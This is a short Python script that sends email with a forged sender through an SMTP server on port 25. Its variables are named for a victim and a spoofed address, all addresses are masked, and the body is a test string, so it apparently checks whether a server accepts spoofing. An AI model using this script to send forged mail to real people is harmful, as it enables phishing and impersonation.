import smtplib
import ssl

port = 25
victim_email = "xxxx@xxx.us"
spoofed_email = "xx@x.us"

smtp_server = "xxxxxxxxx.us"
context = ssl.create_default_context()

message = """\
From: Test <xxxxx@x.us>
To: Ktest <x@x.us>
Subject: Super Important Message
test000!.
"""

try:
    server = smtplib.SMTP(smtp_server, port)
    server.ehlo('xxxxxxxxx.us')
    server.starttls(context=context)
    server.ehlo('xxxxxxxxx.us')
    server.sendmail(spoofed_email, victim_email, message)
except Exception as e:
    print(e)
finally:
    server.quit()